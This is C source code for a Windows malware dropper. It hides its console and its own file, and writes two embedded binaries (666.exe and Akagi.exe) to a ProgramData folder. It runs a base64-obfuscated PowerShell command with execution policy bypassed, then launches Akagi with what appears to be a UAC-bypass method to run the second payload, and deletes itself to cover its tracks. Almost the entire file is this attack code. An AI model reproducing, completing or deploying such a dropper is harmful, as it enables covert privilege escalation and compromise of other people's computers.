// Phoenixthrush UwU 2022

#include <stdio.h>
#include <unistd.h>
#include <windows.h>

/* http://elm-chan.org/junk/32bit/binclude.html */
#define IMPORT_BIN(sect, file, sym) asm (\
    ".section " #sect "\n" \
    ".balign 4\n" \
    ".global " #sym "\n" \
    #sym ":\n" \
    ".incbin \"" file "\"\n" \
    ".global _sizeof_" #sym "\n" \
    ".set _sizeof_" #sym ", . - " #sym "\n" \
    ".balign 4\n" \
    ".section \".text\"\n")

int main(int argc, char** argv) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    char* crr_file = argv[0];
    SetFileAttributes(crr_file, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    IMPORT_BIN(".rodata", "binaries/666.bin", Bin_666);
    extern const char Bin_666[], _sizeof_Bin_666[];

    IMPORT_BIN(".rodata", "binaries/Akagi.bin", AkagiBin);
    extern const char AkagiBin[], _sizeof_AkagiBin[];

    mkdir("C:\\ProgramData\\exploit-data");

    FILE *fp = fopen("C:\\ProgramData\\exploit-data\\666.exe", "wb");
    fwrite(Bin_666, 1, 62195, fp);  /* reserving ~ 61 kB */
    fclose(fp);

    FILE *fpp = fopen("C:\\ProgramData\\exploit-data\\Akagi.exe", "wb");
    fwrite(AkagiBin, 1, 76800, fpp);  /* reserving ~ 75 kB */
    fclose(fpp);

    // removing the privacy oobe via registry (using exec in future instead of system)
    system("powershell.exe -exec bypass -enc cgBlAGcAIABhAGQAZAAgACIASABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwATwBPAEIARQAiACAALwB2ACAAIgBEAGkAcwBhAGIAbABlAFAAcgBpAHYAYQBjAHkARQB4AHAAZQByAGkAZQBuAGMAZQAiACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmADsAIAByAGUAZwAgAGEAZABkACAAIgBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAE8ATwBCAEUAIgAgAC8AdgAgACIARABpAHMAYQBiAGwAZQBQAHIAaQB2AGEAYwB5AEUAeABwAGUAcgBpAGUAbgBjAGUAIgAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAgAC8AZgA=");

    char *AkagiPath = "C:\\ProgramData\\exploit-data\\Akagi.exe";
    execl(AkagiPath, AkagiPath, "33", "C:\\ProgramData\\exploit-data\\666.exe", NULL);

    remove(crr_file);

    return 0;
}